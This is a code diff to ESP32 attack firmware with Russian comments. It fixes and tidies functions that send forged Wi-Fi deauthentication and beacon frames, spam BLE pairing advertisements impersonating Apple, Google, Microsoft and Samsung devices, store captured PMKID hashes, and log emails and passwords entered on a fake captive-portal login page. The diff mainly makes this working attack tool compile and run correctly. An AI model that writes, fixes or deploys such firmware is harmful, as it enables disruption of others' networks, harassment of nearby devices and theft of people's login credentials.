@@ -22,7 +22,6 @@
 #define DEAUTH_REASON_CODE    0x07
 #define FRAME_PROBE_REQ_MASK  0xFC
 #define FRAME_PROBE_REQ_VALUE 0x40
-#define SAE_AKM_SUITE_BYTE3   0x08
 
 #define BLE_APPLE_SOUR        0
 #define BLE_GOOGLE_FASTPAIR   1
@@ -71,13 +70,13 @@ String apPassword = AP_PASS;
 
 // ---------- Работа с логами ----------
 void flushPortalLog() {
-  if (!portalLogBuffer || portalLogLen==0) return;
+  if (!portalLogBuffer || portalLogLen == 0) return;
   File f = LittleFS.open(PORTAL_LOG, "a");
   if (f) { f.write((uint8_t*)portalLogBuffer, portalLogLen); f.close(); }
   portalLogLen = 0;
 }
 void flushPMKIDFile() {
-  if (!pmkidBuffer || pmkidBufferLen==0) return;
+  if (!pmkidBuffer || pmkidBufferLen == 0) return;
   File f = LittleFS.open(PMKID_FILE, "a");
   if (f) { f.write((uint8_t*)pmkidBuffer, pmkidBufferLen); f.close(); }
   pmkidBufferLen = 0;
@@ -100,7 +99,7 @@ void addPMKIDHash(const String& hash) {
 
 // ---------- Wi‑Fi атаки ----------
 void sendDeauthPacket(const uint8_t* bssid, uint8_t ch) {
-  esp_wifi_set_channel(ch, WIFI_SEC_CHAN_NONE);
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
   uint8_t pkt[26] = { 0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
   memcpy(pkt+10, bssid, 6);
   memcpy(pkt+16, bssid, 6);
@@ -109,7 +108,7 @@ void sendDeauthPacket(const uint8_t* bssid, uint8_t ch) {
 }
 
 void sendBeaconFrame(const String& ssid, uint8_t ch) {
-  esp_wifi_set_channel(ch, WIFI_SEC_CHAN_NONE);
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
   uint8_t bcn[128] = { 0x80,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF };
   for (int j=0; j<6; j++) bcn[10+j] = random(256);
   memcpy(bcn+16, bcn+10, 6);
@@ -175,18 +174,24 @@ void startBleAdv(int variant) {
       adv.setFlags(0x06);
       { uint8_t m[] = {0x00,0x00,0x00};
         adv.setServiceData(NimBLEUUID("0000fe2c-0000-1000-8000-00805f9b34fb"), std::string((char*)m,3)); } break;
-    case BLE_MICROSOFT_SWIFTPAIR:
+    case BLE_MICROSOFT_SWIFTPAIR: {
       adv.setFlags(0x06);
-      { uint8_t s[] = {0x01,0x00,0x00,0x00,0x00,0x00};
-        adv.setManufacturerData(0x0006, std::string((char*)s,6)); } break;
-    case BLE_SAMSUNG:
+      uint8_t ms[] = {0x06, 0x00, 0x01,0x00,0x00,0x00,0x00,0x00}; // company ID 0x0006 LE + data
+      adv.setManufacturerData(std::string((char*)ms, 8));
+      break;
+    }
+    case BLE_SAMSUNG: {
       adv.setFlags(0x06);
-      { uint8_t s[] = {0x00,0x00};
-        adv.setManufacturerData(0x0075, std::string((char*)s,2)); } break;
-    case BLE_APPLE_JUICE:
+      uint8_t sam[] = {0x75, 0x00, 0x00,0x00}; // company ID 0x0075 LE + data
+      adv.setManufacturerData(std::string((char*)sam, 4));
+      break;
+    }
+    case BLE_APPLE_JUICE: {
       adv.setFlags(0x1A);
-      { uint8_t j[] = {0x01,0x00,0x00,0x00,0x00,0x00,0x00};
-        adv.setManufacturerData(0x004C, std::string((char*)j,7)); } break;
+      uint8_t aj[] = {0x4C,0x00, 0x01,0x00,0x00,0x00,0x00,0x00,0x00}; // company ID 0x004C LE + 7 bytes
+      adv.setManufacturerData(std::string((char*)aj, 9));
+      break;
+    }
   }
   pAdv->setAdvertisementData(adv);
   pAdv->start();
@@ -265,7 +270,7 @@ void autoPwnTask(void*) {
 
 void bleSpamTask(void*) {
   NimBLEDevice::init("Licifer_BLE");
-  NimBLEDevice::setPower(9);
+  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
   unsigned long last=0; int cur=0;
   while(1) {
     if (attack.bleSpam && millis()-last>250) {
@@ -330,8 +335,25 @@ void webServerTask(void*) {
 
   server.addHandler(&ws);
   server.on("/", HTTP_GET, [](AsyncWebServerRequest* r){ r->send(LittleFS,"/index.html","text/html"); });
-  server.on("/api/portal", HTTP_GET, [](AsyncWebServerRequest* r){ flushPortalLog(); r->send(LittleFS.exists(PORTAL_LOG)?r->send(LittleFS,PORTAL_LOG,"text/plain"):r->send(200,"text/plain","")); });
-  server.on("/api/pmkid", HTTP_GET, [](AsyncWebServerRequest* r){ flushPMKIDFile(); r->send(LittleFS.exists(PMKID_FILE)?r->send(LittleFS,PMKID_FILE,"text/plain"):r->send(200,"text/plain","")); });
+
+  server.on("/api/portal", HTTP_GET, [](AsyncWebServerRequest* r){
+    flushPortalLog();
+    if (LittleFS.exists(PORTAL_LOG)) {
+      r->send(LittleFS, PORTAL_LOG, "text/plain");
+    } else {
+      r->send(200, "text/plain", "");
+    }
+  });
+
+  server.on("/api/pmkid", HTTP_GET, [](AsyncWebServerRequest* r){
+    flushPMKIDFile();
+    if (LittleFS.exists(PMKID_FILE)) {
+      r->send(LittleFS, PMKID_FILE, "text/plain");
+    } else {
+      r->send(200, "text/plain", "");
+    }
+  });
+
   server.on("/portal/login", HTTP_POST, [](AsyncWebServerRequest* r){
     addPortalLog("Email:"+r->arg("email")+" Pass:"+r->arg("password"));
     r->send(200,"text/html","<h2>Connected</h2>");
